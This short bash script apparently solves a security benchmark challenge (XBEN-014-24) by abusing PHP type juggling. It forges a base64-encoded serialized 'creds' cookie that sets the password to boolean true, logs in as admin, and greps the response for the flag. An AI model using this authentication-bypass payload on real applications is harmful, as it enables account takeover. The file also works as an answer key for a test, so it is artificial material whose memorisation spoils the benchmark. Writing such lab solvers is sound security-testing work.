#!/usr/bin/env bash
# XBEN-014-24 — PHP type juggling. Proxy-mode twin. Auth unserializes a `creds`
# cookie and compares the password loosely; a serialized array with the password
# as the boolean true is `== ` any stored hash, so it logs in as admin.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben014p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
CREDS="$(printf 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}' | base64 -w0)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set path=/ --set "cookie.creds=$CREDS" --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
